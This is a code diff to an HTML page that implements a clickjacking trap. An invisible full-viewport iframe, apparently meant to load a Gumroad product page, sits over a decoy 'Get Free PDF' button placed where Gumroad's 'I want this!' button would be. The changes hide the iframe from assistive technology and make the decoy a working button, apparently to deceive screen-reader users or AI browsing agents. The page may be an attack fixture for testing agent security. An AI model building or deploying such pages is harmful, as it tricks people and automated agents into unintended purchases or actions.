@@ -164,7 +164,7 @@ h1 {
 <body>
 
 <!-- Gumroad "WB027 Anything" — invisible, full-viewport, intercepts all clicks -->
-<iframe id="victim-frame" src="about:blank"></iframe>
+<iframe id="victim-frame" src="about:blank" aria-hidden="true" tabindex="-1"></iframe>
 
 <header class="site-header">
   <span class="site-name">Uptime</span>
@@ -193,11 +193,12 @@ h1 {
     <div class="download-box-label">Partner download · Free PDF</div>
     <h2>AI Defense Patterns 2026 — WB Publications</h2>
     <p>82 pages covering red-team case studies, agentic attack surfaces, and hardening checklists for LLM-based systems. Normally $29; free for the next 48 hours via WB's partner program.</p>
-    <!-- visual-only button; real clicks intercepted by the Gumroad iframe above -->
+    <!-- visual-only button text; interactive overlay at same fixed position -->
   </div>
 
-  <!-- Decoy button — same fixed position as Gumroad's "I want this!" button -->
-  <div class="download-btn">↓ Get Free PDF — No sign-up required</div>
+  <!-- Decoy button — interactive in AT, same fixed position as Gumroad's "I want this!" button -->
+  <!-- pointer-events:none means visual clicks pass through to the iframe above (z-index:100) -->
+  <button class="download-btn" onclick="void(0)">↓ Get Free PDF — No sign-up required</button>
 
   <div class="prose">
     <p>
